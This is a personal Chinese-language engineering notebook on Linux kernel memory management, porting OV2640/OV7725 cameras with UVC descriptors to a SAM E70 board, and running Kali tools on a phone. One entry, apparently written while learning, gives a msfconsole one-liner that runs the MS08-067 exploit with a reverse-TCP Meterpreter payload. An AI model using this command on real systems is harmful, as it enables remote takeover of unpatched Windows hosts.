			借用一会。借用这段逻辑地址空间，建立映射到想访问的那段物理内存（即填充内核PTE页面表），
			临时用一会，用完后归还。这样别人也可以借用这段地址空间访问其他物理内存，实现了使用有限的地址空间，访问所有所有物理内存
	start_kernel启动过程:
		在初始化过程中, 还必须建立内存管理的数据结构, 以及很多事务. 因为内核在内存管理完全初始化之前就需要使用内存.
		start_kernel()
		    |---->page_address_init()
		    |     考虑支持高端内存
		    |     业务：初始化page_address_pool链表；
		    |          将page_address_maps数组元素按索引降序插入
		    |          page_address_pool链表; 
		    |          初始化page_address_htable数组.
		    | 
		    |---->setup_arch(&command_line);
		    |     初始化特定体系结构的内容
		    	  |
		    	  |---->arm64_memblock_init( );
		          |     初始化引导阶段的内存分配器memblock
			  |     (memblock已经通过arm64_memblock_init完成了初始化, 至此系统中的内存可以通过memblock分配了)
		          |
		          |---->paging_init();
		          |     分页机制初始化
			  |     (paging_init完成了分页机制的初始化, 至此内核已经布局了一套完整的虚拟内存空间)
		          |
		          |---->bootmem_init();   [当前位置]
		          |     始化内存数据结构包括内存节点, 内存域和页帧page
		                |
		                |---->arm64_numa_init();
		                |     支持numa架构
		                |
		                |---->zone_sizes_init(min, max);
		                    来初始化节点和管理区的一些数据项
		                    |
		                    |---->free_area_init_node
		                    |   初始化内存节点
		                    |
		                        |---->free_area_init_core
		                            |	初始化zone
		                            |
		                            |---->memmap_init
		                            |	初始化page页面
		                |
		                |---->memblock_dump_all();
		                |   初始化完成, 显示memblock的保留的所有内存信息
		         	   |
		    |---->build_all_zonelists()	初始化每个内存节点的zonelists
		    |     为系统中的zone建立后备zone的列表.
		    |     所有zone的后备列表都在
		    |     pglist_data->node_zonelists[0]中;
		    |
		    |     期间也对per-CPU变量boot_pageset做了初始化. 
	 	    |
		    |
		    |---->page_alloc_init()
		         |---->hotcpu_notifier(page_alloc_cpu_notifier, 0);
		         |     不考虑热插拔CPU 
		         |
		    |---->pidhash_init()
		    |     详见下文.
		    |     根据低端内存页数和散列度，分配hash空间，并赋予pid_hash
		    |
		    |---->vfs_caches_init_early()
		          |---->dcache_init_early()
		          |     dentry_hashtable空间，d_hash_shift, h_hash_mask赋值；
		          |     同pidhash_init();
		          |     区别:
		          |         散列度变化了（13 - PAGE_SHIFT）;
		          |         传入alloc_large_system_hash的最后参数值为0;
		          |
		          |---->inode_init_early()
		          |     inode_hashtable空间，i_hash_shift, i_hash_mask赋值；
		          |     同pidhash_init();
		          |     区别:
		          |         散列度变化了（14 - PAGE_SHIFT）;
		          |         传入alloc_large_system_hash的最后参数值为0;
		          |
		在系统启动过程期间, 使用了额外的简化悉尼股市的内存管理模块, 然后在初始化完成后, 将旧的模块丢弃掉.
		setup_arch 	        是一个特定于体系结构的设置函数, 其中一项任务是负责初始化自举分配器
		mm_init_cpumask 	初始化CPU屏蔽字
		setup_per_cpu_areas 	函数(查看定义)给每个CPU分配内存，并拷贝.data.percpu段的数据. 为系统中的每个CPU的per_cpu变量申请空间.
					在SMP系统中, setup_per_cpu_areas初始化源代码中(使用per_cpu宏)定义的静态per-cpu变量, 
					这种变量对系统中每个CPU都有一个独立的副本.此类变量保存在内核二进制影像的一个独立的段中,
					setup_per_cpu_areas的目的就是为系统中各个CPU分别创建一份这些数据的副本在非SMP系统中这是一个空操作
		build_all_zonelists 	建立并初始化结点和内存域的数据结构
		mm_init 		建立了内核的内存分配器,
					其中通过mem_init停用bootmem分配器并迁移到实际的内存管理器(比如伙伴系统)
					然后调用kmem_cache_init函数初始化内核内部用于小块内存区的分配器
		kmem_cache_init_late 	在kmem_cache_init之后, 完善分配器的缓存机制,　
					当前3个可用的内核内存分配器slab, slob, slub都会定义此函数　
		kmemleak_init 		Kmemleak工作于内核态，Kmemleak 提供了一种可选的内核泄漏检测，
					其方法类似于跟踪内存收集器。当独立的对象没有被释放时，
					其报告记录在 /sys/kernel/debug/kmemleak中, Kmemcheck能够帮助定位大多数内存错误的上下文
		setup_per_cpu_pageset 	初始化CPU高速缓存行, 为pagesets的第一个数组元素分配内存, 换句话说, 其实就是第一个系统处理器分配
					由于在分页情况下，每次存储器访问都要存取多级页表，这就大大降低了访问速度。
					所以，为了提高速度，在CPU中设置一个最近存取页面的高速缓存硬件机制，当进行存储器访问时，
					先检查要访问的页面是否在高速缓存中.
	内存分配:
		linux内核的内存管理分三个阶段。
			第一阶段 | 系统启动 | bootmem或者memblock初始化完成 
				(此阶段只能使用memblock_reserve函数分配内存， 早期内核中使用init_bootmem_done = 1标识此阶段结束)
				(bootmen内核刚启动时执行的内存管理!!)
			第二阶段 | bootmem或者memblock初始化完 | buddy完成前 | 引导内存分配器bootmem或者memblock接受内存的管理工作, 
				早期内核中使用mem_init_done = 1标记此阶段的结束 
			第三阶段 | buddy初始化完成 | 系统停止运行 | 可以用cache和buddy分配内存	
		memblock内存分配
			是将所有的物理内存放到memblock.memory中作为可用内存来管理, 
			分配过的内存只加入到memblock.reserved中, 并不从memory中移出
			同理释放内存也会加入到memory中. 也就是说, memory在fill过后基本就是不动的了. 
			申请和分配内存仅仅修改reserved就达到目的. 在初始化阶段没有那么多复杂的内存操作场景, 
			甚至很多地方都是申请了内存做永久使用的, 所以这样的内存管理方式已经足够凑合着用了, 
			毕竟内核也不指望用它一辈子. 在系统完成初始化之后所有的工作会移交给强大的buddy系统来进行内存管理
	伙伴系统:
		分出一个含2的n次方个页的块,然后这个块分成连部分,一个使用,一个空闲.这两个块是伙伴(n根据实际情况定)
		如果使用的块提供的内存不够,空闲的块再次分成两块,一个使用,一个空闲.这两个块又是另一伙伴
		如此类推.
		内核初始化时使用的是memblock内存分配,初始化后,就把所有内存管理的任务交给了伙伴系统
		当那一个使用的块占用完毕,会跟自己的空闲块伙伴重新变成上一级的空闲块
		有关伙伴系统和当前状态的信息可以在/proc/buddyinfo中获取
		kmalloc: 一般是分配 内核的空间的zone_nomal虚拟空间,直接映射到 物理内存的 从3g+16mb到3g+895mb 的内存
		vmalloc:一般分配 zone_highmen的前120mb虚拟空间 可映射每一个物理内存位置
		kmap:一般是分配 zone_highmen的中间4mb虚拟空间 可以映射每一个物理内存位置
		kmap_automic:kmap的高效版,一般是分配 zone_highmen的最后4mb虚拟空间 可以映射每一个物理内存位置
	slab分配器:
		也叫slab着色器,其实就是一个个的结构数据预备队列,用的时候使用已分配好内存的空闲的结构数据,用完后返还回空闲结构数据
		通常用于 常用的结构数据 例如 struct task 什么的
		
		这种方式,比起 每次使用新结构数据时 都要重新通过伙伴系统分配内存,不用则释放内存的做法要高效
		slab分配器初始化:
			start_kernel() -> mm_init() -> kmem_cache_init();
			第一个阶段 	是根据kmem_cache来设置cache_cache的字段值
			第二个阶段 	首先是创建arraycache_init对应的高速缓存，同时也是在这个kmem_cache_create的调用过程中，
					创建了用于保存cache的kmem_cache的slab，并初始化了slab中的各个对象
			第三个阶段 	创建kmem_list3对应的高速缓存，在这里要注意的一点是，
					如果sizeof(arraycache_t)和sizeof(kmem_list3)的大小一样大，
					那么就不再使用kmem_cache_create来为kmem_list3创建cache了，
					因为如果两者相等的话，两者就可以使用同一个cache
			第四个阶段 	创建并初始化所有的通用cache和dma cache
			第五个阶段 	创建两个arraycache_init对象，
					分别取代cache_cache中的array字段 和 malloc_sizes[INDEX_AC].cs_cachep->array字段
			第六个阶段 	创建两个kmem_list3对象，取代cache_cache中的kmem_list3字段
					和malloc_sizes[INDEX_AC].cs_cachep->nodelist3字段.
					如此一来，经过上面的六个阶段后，所有的初始化工作基本完成了
		slab使用:
			例如系统频繁申请使用 A结构的数据,所以建立一个A结构数据的预备队
			kmem_cache_create() 创建一个 A结构数据预备队! 从伙伴系统里分出内存组建预备队
			struct kmem_cache 是一个预备队的描述符结构,即一个 struct kmem_cache代表 一个结构数据的预备队
			一个预备队只服务于同一个数据结构
			一个 A结构数据预备队:
				有多个slab组,一个slab组是连续的多个页构成
				每个slab组上放置着多个 A结构数据对象
				这些对象,标记为空闲的表示未使用,标记非空闲表示正在使用中.
				当所有slab上的对象都被使用时,内核进程还继续需要新的结构数据时,就会通过伙伴系统继续分配内存来组建新的slab组
			kmem_cache_alloc() 分配空闲结构数据对象 给进程使用,
			kmem_cache_free() 回收不在使用的数据对象, 即不再使用的数据对象重新标记为空闲
			kmem_cache_destroy 当所有A结构数据对象都不再使用时,可调用此销毁整个预备队,释放内存
				依次扫描slabs_free链表上的slab. 首先对每个slab上的每个对象调用析构器函数，然后将slab的内存空间返回给伙伴系统.
				释放用于per-CPU缓存的内存空间。
				从cache_cache链表移除相关数据。
	
			补充:
			struct kmem_cache 中有多个 array_cache 内容是指向cpu的,有多少个cpu就有多少个array_cache
			array_cache 是指向 cpu 的高速缓存的,
			即如果有些需要使用的结构数据对象 要求对象是在 cpu_cache(即高速缓存)时,跟array_cache的内容就有关系了
		kmalloc: 分配内存给结构数据时,
			如果检测到是常用的结构数据时,就会选择使用slab分配
			然后如果发现没有对应的预备队,就会建一个 kmem_cache_create()
			然后 kmem_cache_alloc() 分配出一个对象来供使用
		kfree: 释放一个结构数据
			如果检测到预备队里的 数据对象, 就kmem_cache_free() 标记空闲并归还给预备队
memory深入学习:(用户进程的用户态内存分配管理)
	每个用户进程都有自己的用户态空间和内核空间,对于32机器说共4gb,其中3gb用户空间和1gb用户空间!!
	其实,用户进程的用户态进程部分和内核态部分应该算作是两个独立的进程,都参与调度!!但是他们比较特别,共用一个PID!!
		如果是内核态部分在运作时,用户态部分永远在沉睡,进程调度永远不会调到这个对应的用户态部分,除非内核态部分完成并唤醒用户态部分!!!
		相反谈论,同样道理
	用户态部分有自己的3g内存空间, 内核态部分,则和所有内核进程共用1g空间.
		用户态部分有自己的3g内存空间, 指每个用户进程用户态部分都有自己页表映射到物理内存,
		内核态部分共用1g空间,指用户进程内核态部分都共用一张页表.
	一个用户进程的用户态地址空间主要由两个数据结来描述:
		mm_struct:
			最高层次的mm_struct结构描述了一个用户态部分的进程的整个虚拟地址空间。每个用户进程只有一个mm_struct结构,
			在每个用户进程的task_struct结构中, 有一个指向该进程的结构,
			成员有页表位置,栈,堆,参数变量,系统变量,等等的位置
			mm_struct 这个数据对象是放在内核态内存区的,虽然他是用来描述一个用户进程用户态部分的内存结构
		vm_area_structs
			较高层次的结构vm_area_truct描述了用户态虚拟地址空间的一个区间(简称虚拟区).
			一般的虚拟区有:
				当前运行代码的二进制代码. 该代码通常称之为text,所处的虚拟内存区域称之为代码段(text section).
				可执行文件的已初始化全局变量的内存映射, 称为数据段(data section).
				包括未初始化全局变量(也就是bss段的零页)的内存映射， 页面中的信息全部为0值, 所以可用于映射bss段等目的.
				用于保存局部变量和实现函数/过程调用栈(不要和进程内核栈混淆, 进程的内核栈独立存在并由内核维护)的零页内存映射
				程序使用的动态库的代码, 诸如C库或动态连接程序等共享库的代码段, 数据段和bss段.
				存储动态产生的数据的堆
				环境变量和命令行参数的段.
				将文件内容映射到虚拟地址空间中的内存映射
	建立布局(建立用户进程和内核进程均适用):
		当fork一个新进程后,执行exec 把一个新程序替换原有的程序时,就出现加载程序文件的操作
		会使用load_elf_binary装载一个ELF二进制程序文件,装嵌的工程中需要对进程的各种空间重新布局适应新程序
		重新布局的工作有:
			arch_pick_mmap_layout 根据实际情况选择布局样式,例如根据 legacy_va_layout 指示
			如何选择内存映射的基地址, 该工作由mmap_base来完成
		回到load_elf_binary. 该函数最后需要在适当的位置创建栈





201708011
m7板子samv70移植ov7725
ov7725的一些内容:
	i2c: 0x42 for write, 0x43 for read
	未知数据输出开关: com3 bit0  ??  com11 bit1  HREF bit3   ??  com2 bit4  ??
		         HSTART~VSIZE(这里是定的是采集的图片大小,与输出开关无关)
		         com10 bit1(重点,这里似乎是设置vsync有效的极性)
	由于不知道图片传输的信号开关,所以试图 从采集图片开始分析!! (还没开始分析)
同样m7板子same70_xplaint移植 摄像头
	烧录环境搭建: 
		iar jlink不行, 但是sam-ba可以通过j-link烧录!
		注意编译前 linker文件选flash的,不是sram的
	测试:
		使用ov2640 ,居然不能读出型号寄存器的值,但i2c完好工作!
		流数据并口连接: ISI_D0~D7 接seneor D2~D9
		卧槽,更奇葩的来了:烧录了程序后,先开发完全断电!!!然后插上usb,然后打开软件就可以看到了视频流!!!!
		但是如果在非掉电的情况下,reset 后, 就会出现读取芯片的寄存器失败!!!!
			原因是,一上电后sensor芯片其实一直在做视频流输出的工作,不管有没有打开了视频软件,
			当我们非掉电reset时,sensor其实并没有reset到,反而因为突然的输入xclk断开了而出现一些混乱,
			整体说sensor已经跑飞了!!!!需要reset,但是开发板的reset没有reset到sensor!!1
			证明:当我在开发板非掉电reset前拔掉sensor的3.3v针,非掉电reset后插上, 就成功启动了!!
		所以试图软件reset sensor,(sensor虽然跑飞,但是i2c模块还是正常工作的,通过i2c传输软reset到指定寄存器)
			1,例如操作pwdn 但是后来发现买回来的ov2640模块的pwdn实际上是notconnect的,
			  任我m7芯片怎么操作 PIO_Set/PIO_Clear pwdn针也没有用!!!
			2,尝试操作reset寄存器,注意reset寄存器有多个,易混淆,注意是 sensor控制区的com7寄存器的bit7 而不是其他!!
			  成功!!! 
			  即以后 非掉电reset时,seneor也会得到reset!!! 从而可以正常启动!!!!!
			  相关重点代码:
				//by william
				const sensorReg_t ov2640rst[] = {
					{0xFF, 0x01},	//选sensor块
					{0x12, 0x80},	//com7 bit7 reset
				        {0x0E, 0x11},	//0x0e是一个无作为的寄存器,通过给无作为寄存器写内容达到延时作用!!!!
				        {0x0E, 0x11},
				        {0x0E, 0x11},
				        {0x0E, 0x11},
				        {0x0E, 0x11},
				        {0x0E, 0x11},
				        {0x0E, 0x11},
				        {0x0E, 0x11},
				        {0x0E, 0x11},
				        {0x0E, 0x11},
				        {0x0E, 0x11},
				        {0x0E, 0x11},
					{0xFF, 0xFF}
				};
			        //by william ov2460 reset
			        sensor_twi_write_regs (&twid, ov2640rst);
				//注意 sendorStatus_t sensor_twi_write_regs(Twid *pTwid, const sensorReg_t *pReglist)
				//还有 Twid twid;
开始移植 ov7725:
	The device slave addresses are 0x42 for write and 0x43 for read  即7位地址为0x21
	ov7725的芯片跑不过来处理i2c传来的内容,所以每次i2c通讯之间需要加延时!!!!设置时 原子读过程中,写地址,和读数据间都要延时!!!
	但是秉火的可以通讯,秉火的是12mhz运转时钟的
	跟商家换了个模块 可以i2c通讯了 也有vs hf pck d0-d7 的信号输出了,但上位机软件就是没有图像
	换了商家的代码,终于有视频流了!!! 但是图像色彩翻转,原来是用了RGB格式, 应该换成yuv格式
	0x12,0x40 换成了yuv格式 还是色彩颠倒!!!
	怀疑是数据流传输格式问题.
		更改:UV swap (works with register COM3[4] (0x0C)and DSP_Ctrl3[7](0x66))
		{COM3[4], DSP_Ctrl3[7]}	= 10: U0Y0, V1Y1, U2Y2, V3Y3, ...
		成功显示!!!
	从QVGA(320x240) 转到 VGA(640x480)
		main,ov7725 该做成vga的也该了,而且摄像头也变慢了,应该是摄像头设置为vga成功了,
		但是还是出来 320x240 的图,demo说过由于空间问题,所以demo只输出qvga的视频流,所以还有某个与usb交互的地方固死了参数!!
		怀疑 viddprobedata 里的 bframeIndex 应该为 2 !!  也不对
		找到了frmW, frmH的初次声明给定值,设为 640,480 出错了,居然黑屏了,但是手动调到640x480后,可以工作!!!
		但是出现断帧的情况!!!首先设置帧速率30f/s 这个跟设置uvc 的帧速率有关
		但是怎么调试还是出现断帧的情况!! 就是第一次打开摄像头没事,后面打开时就断帧了,
		另外:软件打开时不能默认视频流是vga 后面发现:
			VS Format Uncompressed 的 Payload uncompressed format 的 default frameformat选了1(QVGA)的,应该选2(vga)
			此外,不要忘记手动设frmW, frmH的初次声明给定值,设为 640,480,不然没有图像出来!!
			还有,开发板给 sensor 的工作时钟改回 25mhz
		怀疑是mck速度跟不上,或者是buffer不够大!!
		修改: ISI_MAX_PREV_BUFFER
		      viddProbeData -> FRAME_INTERVALC,FRAME_PACKET_SIZE_HS 
		      没有用
		本来找最终原因的,但是还是算了,直接在再次开启前重新初始化就是了
		就是在 if(bVidON && !bVideoON) 段最后添加:
			_isiinit()
			_ConfigureTc()
			成功显示,不在出现 多次重开上位机也不再出现断帧现象
			初步怀疑是 timer counter 的问题!!
	建立UVC命令:		
		还有,怀疑 getcur setcur 根本什么都没有工作过, 所以viddProbeData()似乎么有被修改过, frmW,frmH也没有被改过!!
		怀疑所有 getcur 都NAK回应, 而setcur是工作的!! 注意 probedata过程中并未被改动过,所以 
		添加 trace_debug !! USBLib_Trace.h 添加define!!
		_isiinit里的setinputstream为啥设的是 RGB_INPUT??不是说好是YUV的吗?
			哲理有好多预置,比如sensor采样窗口大小,输出图片流的窗口大小,sensor图片流格式RGB
	m7开发板,去外在sram:
		通过isi_DMA 寄存器分析 isi工作原理, 
			isiDMA有两种,一种是previeW的即采集的原始数据DMA,另一种把原始数据编码处理后再缓存的DMA
			我们就 原始数据DMA举例说明:
			首先这种DMA框架有两个地址寄存器 descriptor 和 buffer 
			descriptor 放的是 descriptor数组结构对象A的地址
			buffer 放的是帧缓存首地址A
			一个descriptor数组结构对象有3个成员,缓存地址A,控制数据A,指向下一个descriptor数组结构对象B的指针
			首先,把一个 descriptorA 和 bufferA 的地址 放到对应寄存器, 开启服务
			isi传来的字节刘数据,会存到 buffer寄存器指向的寄存器,然后bufer寄存器自动加1指向下一字节,继续接收数据
			直到收到了一个帧的数据,然后在isi发生中断的同时,
			isi模块自动把 descriptor寄存器 指向的数组对象A 第三个成员(下一个descriptor数组对象B的指针)放入descriptor寄存器
			然后再把 descriptorB 的第一个成员 bufferB的地址 放入 buffer寄存器
			就这样准备好接收下一帧数据,由于这种机构,帧缓存列表满了后,可以回过来重新覆写
			isiDMA框架接收数据是独立于cpu执行的.所以不管cpu在干什么,isi都只顾自己源源不断,并不停歇地接收一帧帧的数据
			每传输好一帧就,标记一次flag,但是isi本身不会等待flag被消除后才重新执行下一帧的接收
			就是说不管flag有没有被clear,每帧接收完后都会例行set一次flag!! 
			最后关于手动写入地址寄存器的数据 都是 word对齐的,即32位,4个字节对齐,
			虽然4字节对齐,但因为一帧vga_yuv至少达600kb,是4字节的倍数,所以符合4字节对齐,并没有问题
		不能指望通过isi来传输图片!!因为没有留出dma接口,没有其他接口提供
		那么就剩下利用菜谱主频来获取数据,但是占据大部分cpu频率,使得cpu无法干其他事情!!!
	发现gray模式一帧300kb, 可以尝试使用gray模式试试!!!!
		grayscale太奇葩了,sensor是vga采集的格式的,但是经过isi后,原始vga数据被直接阉割成 QVGA 卧槽,做不下去了!!
		还有usb数据流 断帧的问题!!
			假如重福发同一sram位置的同一帧的数据就没有问题!!,但是一旦改变着sram位置发数据时,就出现断帧情况
		注意.ISI_setPreviewSize 和 ISI_SetSensorSize 在 设置gray模式中非常诡异!!! 是vga变QVGA的元凶!!
		现在停在 ISI_setPreviewSize 和 ISI_SetSensorSize 的探究!!!
		重新分析 isi grayscale 的初始化!!!
		灰阶的 真的硬生生把 VGA 割回 qvga 的分辨率!!!
		怀疑 GS_MODE GRAYSCALE 的问题, 
			发现demo 没有可以设置 GS_MODE GRAYSCALE 
			手动设置后出问题!! 查看pdf 8-bit gray模式发现: 要求 clear GRAYSCALE !! 
			但demo isi_setGrayscaleMode()预示要设 GS_MODE 先set GRAYSCALE 为 1
			手动 单设 GS_MODE 并任何正负面作用,可以说明 GS_MODE 配合 GRAYSCALE =1 才有用
		pdf 8-bit gray模式 告诉使用 8-bit gray模式 要用 codec_channel, 使用codec_channnel后 发现没有!!!
		pdf 8-bit gray模式 只是注明 ISI_CFG2->IM_HSIZE 要 640/2-1,而ISI_PSIZE->PREV_HSIZE并没有这样说!!
			但是 ISI_PSIZE->PREV_HSIZE 不设成640/2-1, 而是 640-1 时, isi模块工作出错!!
		使用codec_channel 并且, ISI_PSIZE->PREV_HSIZE 设成 640-1 时, isi模块工作继续出错!!
		gray-demo的isi默认设置是 ISI_CFG2:0000 0001 0011 1111 1001 0001 1101 1111
			0-10 bit: 001 1101 1111 = VSIZE = 479
			11 bit: 0 -> 2 pixel gray
			12 bit: 1 -> RGB_MODE->RGB565
			13 bit: 0 -> GRAYSCALE -> disable (这里的GRAYSCALE指的是12位的grayscale)
			14 bit: 0 -> RGB_SWAP -> D7-R7
			15 bit: 1 -> COLOR_SAPCE-> RGB
			16-26 bit: 001 0011 1111 = HSIZE =319
			28-29 bit: 00 -> YCC_SWAP -> byte0-Cb,byte1-Y,byte2-Cr,byte3-Y...
			30-31 bit: 00 -> RGB_CFG -> byte0-R/G(MSB),byte1-G(LSB)/B,byte2-R/G(MSB),byte3-G(LSB)/B ....
		对比彩色demo 的isi默认设置 ISI_CFG2: 0110 0010 0111 1111 1001 0001 1101 1111
			0-10 bit: 001 1101 1111 = VSIZE = 479
			11 bit: 0 -> 2 pixel gray
			12 bit: 1 -> RGB_MODE->RGB565
			13 bit: 0 -> GRAYSCALE -> disable (这里的GRAYSCALE指的是12位的grayscale)
			14 bit: 0 -> RGB_SWAP -> D7-R7
			15 bit: 1 -> COLOR_SAPCE-> RGB
			16-26 bit: 010 0111 1111 = HSIZE =639
			28-29 bit: 10 -> YCC_SWAP -> byte0-Y,byte1-Cb,byte2-Y,byte3-Cr...
			30-31 bit: 01 -> RGB_CFG -> byte0-B/G(MSB),byte1-G(LSB)/R,byte2-B/G(MSB),byte3-G(LSB)/R ....
		新假设: isi 8-bit 灰度 把每个采集的字节都当成 Y ,所以把sensor传来的 U,V 都当成了Y!!
			那就尝试把 ov7725 sensor 输出 改成 YYYYY 的输出!!
			ov7725 开灰度图模式,先要 开SDE 0x64 bit5
			0x26 允许 grayscale 输出黑白灰度!! 但是也是 YUV输出 没有只是Y输出
			0x26 允许 U,固定值,0x60,0x61,填写俩个强制的值,比如说 0x80
				那么u,v的输出就会变成强制值0x80, 从而得到, uv值为不同强制值后,得到不同色系的灰度图 
20170815
使用GNUroot dbian:
手机装kali 工具: 
	https://github.com/LionSec/katoolin/issues?page=3&q=is%3Aissue+is%3Aopen
	https://mp.weixin.qq.com/s/Safyp-WpK6OzyvJbaHmJOA
	问题1:
	katoolin unable to locate package:未解,虽然尝试改 sources.list
	相关sources.list内容	
	deb http://http.kali.org/kali kali-rolling main contrib non-free
	# For source package access, uncomment the following line
	# deb-src http://http.kali.org/kali kali-rolling main contrib non-free
	deb http://http.kali.org/kali sana main non-free contrib
	deb http://security.kali.org/kali-security sana/updates main contrib non-free
	# For source package access, uncomment the following line
	# deb-src http://http.kali.org/kali sana main non-free contrib
	# deb-src http://security.kali.org/kali-security sana/updates main contrib non-free
	deb http://old.kali.org/kali moto main non-free contrib
	# For source package access, uncomment the following line
	# deb-src http://old.kali.org/kali moto main non-free contrib
手机装 metaspoilt 工具: 
	msfinstall perssion deny 怀疑缺库!!!!
	ldd msfinstall 不能查看依赖库,怀疑执行文件不是符合 armhf 硬件框架 
	最终发现是 chmod 没有起作用!!!,所以唉,什么都做不了
	不用傻瓜方法,先试试github方法!!
	rm -r metaspoilt 	//把原来的metaspoilt项目文件夹档案全删除!!	
	//不行,取不到chmod的权限,就不能正常使用.sh文件
	
装桌面 Xserver
	先 google play 安装个XServer XSDL 框架
	然后GNUboot:
		apt-get grade	//本想更新一下库的,居然搞出个大libc6兼容的问题出来!!!
		apt-get install lxde		
		卧槽,出错了: 之前的upgrade 把libc6弄乱了,现在都出这么一句 libc-bin: depends: xxxx is installed 之类
		仅仅 apt-get -f install 未能修复上述问题
		原因是从kali-rolling 那更新了 libc-dev-bin  libc6-dev 但唯独就是更新libc6 时失败了!!!!
		而因为后面操作 libc-dev-bin  libc6-dev 需要高版本的 libc6,由于libc6版本每更新所以失败!!!!
		之前upgrade时,libc6 half-install了,
		解决(重装libc6旧版本): 
				先sources.list把 kali-rolling 数据源去掉!!,然后
				apt-get autoclean
				apt-get update
				apt-get upgrade 
				apt-get install --reinstall libc6=2.19-18+deb8u10  //关键 重装旧版本libc6 
		至此搞定了 libc6 兼容问题,开始今天的主题:安装lxde桌面环境到手机上!!!
		apt-get install auto-apt  //先装auto-apt工具,因为,安装lxde需要各种依赖包,但是命令 apt-get install lxde 不会自动安装依赖包
		auto-apt run apt-get install lxde     //命令格式 auto-apt run [command]	这样就可以自动把依赖包都加上!!!
		然后 至少给装上一个图形界面的终端 Xterm apt-get install xterm
		然后打开 XServer XSDL 查看最后蓝屏指导的命令行
		然后在 GNUboot 上输入添加蓝屏全局变量的命令: export DISPLAY:=0 PLUSE_SERVER=top:127.0.0.1:4712
		然后在 GNUboot 执行: startlxde &
		回到 XServer XSDL 就进入了桌面系统了!
		






20170823
metasploit
	metasploit 是一个 工具框架,打开 metasploit-framework 或者终端输入 msfconsole后,便转到专门的msf终端, msf>
	armitage是metasploit的图形交互版本,使用armitage前 先打开 metasploit-framework
	msf的shell 命令 : 一般说,进入msf终端 手动执行msf命令,不实际,现实更趋向打包msf命令成一个shell命令,写入shell脚本执行例如:
	./msfconsole -x "use exploit/windows/smb/ms08_067_netapi; set RHOST [IP]; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST [IP]; run; exit"  	//这里 -x 参数就是一参数表示:打包msf命令成一个shell命令,然后执行!!
	metasploitable 是一个靶机系统,各种公开的漏洞可供使用!!!








20170824
继续m7 板子添加uvc指令!!!	
加led灯!!
一个完整的uvc configuration 拓扑结构,以下是一个拓扑结构例子,一个拓扑结构有先后顺序地包含多个 descriptor
	
	一个uvc configuration_A 分先后次序包含以下多个descriptor: (**号标记的是要重点理解的项)
	/* configuration descriptor */
		bLength		0x09	//这个descriptor长度(包括bLength) 这里占9字节
		bDescriptorType	0x02	//descriptor 的标记,0x02 表明这个是 configuration 的 descriptor
					//这个descriptor一定在众多 descriptor 之首
					//也表明接下来的 接收到的 descriptor 同属这一个 uvc configuration_A 拓扑结构的内容
		wTotalLength	??	//指整个uvc configuration_A 所有内容所占总字节数,即所有descriptor所占据字节的总和
		bNumInterfaces	0x02	//interface接口数 2个
		bConfigurationValue 0x01//指 uvc configuration_A 的编号 这里编号是 1 
		iConfiguration		//空置,没有用处
		bmAttributes	0x80	//usb 设备特性, 自供电, 不接受远程唤醒
		bMaxPower	??	//usb bus电流大小 这里设了最大 100ma
	/* Interface Association Descriptor (IAD) */
		bLength		0x08	//这个descriptor长度(包括bLength) 这里占8字节
		bDescriptorType	0x0b	//descriptor 的标记,0x0b 表明这个是 Interface Association 的 descriptor
		bFirstInterface 0x00	//控制接口,也是第一个要使用的接口 我们分配 0号接口为这个接口
		bInterfaceCount	0x02	//这个uvc configuration_A分配的 interface接口数 2个
		bFunctionClass	0x0e	//表示这个IAD 分到的 class是:video interface class code (CC_video)   
		bFunctionSubClass 0x03	//表示这个IAD 分到 CC_video 的 SC_VIDEO_INTERFACE_COLLECTION subclass里
		bFunctionProtocol 0x00	//空置,没有用到,必须设为 0x0 表示PC_PROTOCOL_UNDEFINED
		iFunction	0	//这是id,指向对应id的 string descriptor,这个被指的descriptor会有些备注字符串信息, id=0表示没有指向
		//这个descriptor可以说是一个 视频类接口的集合器
	/* VideoControl Interface Descriptor  (VC)*/
		bLength		0x09	//这个descriptor长度(包括bLength) 这里占9字节		
		bDescriptorType	0x04	//descriptor 的标记,0x04 表明这个是 INTERFACE接口 的 descriptor
		bInterfaceNumber 0x0    //这个接口的id是0, 也就是上面IAD->bFirstInterface 指向的接口
	**	bAlternateSetting 0x0	//这个 VideoControl Interface Descriptor 的 归类到 id=0 的Alternatesetting 里的一个子项
	**	bNumEndpoints	0	//这个接口使用多少端口, 这里使用0个,虽然会使用到端口0,但端口0不算入这个统计里,所以是0个
		bInterfaceClass 0x0e	//表示接口 到的 class 是 CC_video ,接口属于 视频类
		bInterfaceSubClass 0x01	//表示接口 分到 CC_video 的 SC_VIDEOCONTROL subclass里, 接口是视频类的控制类
					//即这是一个视频控制接口!!
	**	bInterfaceProtocol 0x0  //空置,没有用到,必须设为 0x0 表示PC_PROTOCOL_UNDEFINED
		iInterface	0	//id=0表示没有指向对应 string descriptor, 没有附加的备注信息
		//以下几个descriptor是紧接这个descriptor的!!进一步描述 视频控制接口
	/* Class-specific Interface header Descriptor about VC */
		bLength		0x0e	//这个descriptor长度(包括bLength) 这里占13字节	
		bDescriptorType 0x24	//descriptor 的标记,0x24 表明这个是 CS_INTERFACE (Class-specific Interface) 接口类 descriptor
		bDescriptorSubType 0x01	//descriptor 的子标记,0x01表明是 接口类 的 VC_header descriptor
	**	bcdUVC 		0x0110	//表示 videocontrol 符合 uvc 1.1 标准 
		wTotalLength	??	//整个 videocontrol interface class 内容的所占总字节数,即整个SC_VIDEOCONTROL子类具体内容所占总字节数
					//包括:
					//	当前的 header descriptor,
					//	Input Terminal Descriptor about Camera ,
					//	Output Terminal Descriptor,
		dwClockFrequency ??	//uvc 设备运转时间,这里是 123mhz
		bInCollection	1	//有多少个 流接口,(streaming interface) 这里有1个
		baInterfaceNr(1)  1	//VideoStreaming interface 1 归这个 VideoControl Interface 管
	/* Class-specific Input Terminal Descriptor about Camera */	camera为源的输入终端
		bLength		0x12	//这个descriptor长度(包括bLength) 这里占18字节	
		bDescriptorType 0x24	//descriptor 的标记,0x24 表明这个是 CS_INTERFACE 接口类 descriptor
		bDescriptorSubtype 0x02	//descriptor 的子标记 0x02 ->VC_INPUT_TERMINAl 这是视频控制接口 的 输入控制端模块
	**	bTerminalID 	0x01	//这个模块 的 id为 1
		wTerminalType	0x0201	//表示是输入控制端模块 控制的是 camera输入	(ITT_CAMERA)
		bAssocTerminal	0	//No association 不知道干什么用的
		iTerminal	0	//id=0表示没有指向对应 string descriptor, 没有附加的备注信息
		wObjectiveFocalLengthMin 0 //No optical zoom supported 不知道干什么用的
		wObjectiveFocalLengthMax 0 //No optical zoom supported 不知道干什么用的
		wOcularFocalLength 0	//No optical zoom supported 不知道干什么用的
